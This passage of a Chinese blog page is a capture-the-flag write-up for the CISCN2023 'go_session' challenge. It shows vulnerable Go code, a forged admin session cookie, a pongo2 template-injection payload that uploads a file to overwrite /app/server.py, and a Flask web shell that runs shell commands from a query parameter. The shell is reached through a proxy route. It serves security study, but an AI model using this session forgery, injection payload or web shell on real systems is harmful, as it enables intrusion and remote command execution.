(</span><br><span class="line">	<span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;html&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">	xssWaf := html.EscapeString(name)</span><br><span class="line">	tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获得session_key可以伪造session,然后访问&#x2F;index。<strong>其中&#x2F;flask?name&#x3D;&#x2F;  发现开启了debug</strong> &#x2F;app&#x2F;server.py可用于可续利用</p>
+<p>猜测session_key为空，本地伪造session-name</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span>   <span class="comment">//通过本地环境获取session-name  其中name值为admin, 进而访问admin</span></span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;Hello, admin&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//MTY4NTYzNzAzOHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzjiKnqOZb_8Re4VMljE_Jx_5kTFNgNBRTeWQGagS7Srg==</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;admin  路由中</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>引入pongo2包，可以进行ssti，类似与python中的ssti。利用方法参考这篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.imwxz.com/posts/2b599b70.html#template%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7">https://www.imwxz.com/posts/2b599b70.html#template%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7</a></p>
+<p>其中<code>xssWaf := html.EscapeString(name)</code>将引号过滤了，考虑其他方法传入字符串。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;c.SaveUploadFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入字符串&#x2F;app&#x2F;server.py覆盖原来的文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flash <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/shell&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    cmd = request.args.get(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        <span class="keyword">return</span> os.popen(cmd).read</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;null&quot;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host = <span class="string">&quot;127.0.0.1&quot;</span>, port = <span class="number">5000</span>, debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后访问<code>/flask?name=/shell?name=ls</code></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/05/19/5.18%20%20blog%E2%80%94%E2%80%94python%20%20pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="python  pickle反序列化">
+      <i class="fa fa-chevron-left"></i> python  pickle反序列化
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#title-%E4%BB%8E%E4%B8%A4%E9%81%93ctf-go%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0go%E5%AE%89%E5%85%A8"><span class="nav-number">1.</span> <span class="nav-text">title:从两道ctf go题目学习go安全</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#VNCTF2023-babygo"><span class="nav-number"></span> <span class="nav-text">VNCTF2023  babygo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E5%88%AB%E5%88%86%E6%9E%90%E5%9B%9B%E4%B8%AA%E8%B7%AF%E7%94%B1"><span class="nav-number">0.1.</span> <span class="nav-text">分别分析四个路由</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN2023-%E5%88%9D%E8%B5%9B-go-session"><span class="nav-number"></span> <span class="nav-text">CISCN2023 初赛 go_session</span></a></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="hh"
+      src="/images/th.jpg">
+  <p class="site-author-name" itemprop="name">hh</p>
+  <div class="site-description" itemprop="description">hh</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/beautchen/beautchen.github.io" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;beautchen&#x2F;beautchen.github.io" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">hh</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
